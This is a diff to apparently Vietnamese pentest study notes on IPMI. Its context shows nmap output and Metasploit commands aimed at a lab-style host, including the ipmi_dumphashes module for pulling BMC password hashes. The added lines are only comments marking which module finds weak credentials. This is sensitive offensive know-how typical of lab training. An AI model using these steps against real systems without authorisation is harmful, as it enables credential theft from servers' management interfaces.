@@ -62,7 +62,7 @@ nmap
     Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
 
 Metasploit Version Scan
-  msf6 > use auxiliary/scanner/ipmi/ipmi_version 
+  msf6 > use auxiliary/scanner/ipmi/ipmi_version                       // chú ý nhé , cái này chỉ là version thôi, còn có 1 cái tìm user pass yếu cơ 
   msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
   msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
   
@@ -107,7 +107,7 @@ Kết luận ngắn: ưu tiên hardening mạng và mật khẩu BMC; coi việc
 Để lấy lại mã băm IPMI, chúng ta có thể sử dụng mô-đun Lấy lại mã băm mật khẩu SHA1 từ xa Metasploit IPMI 2.0 RAKP.
   
   Metasploit Dumping Hashes
-    msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
+    msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes                                 // đây cái này tìm user passw yếu 
     msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
     msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
     
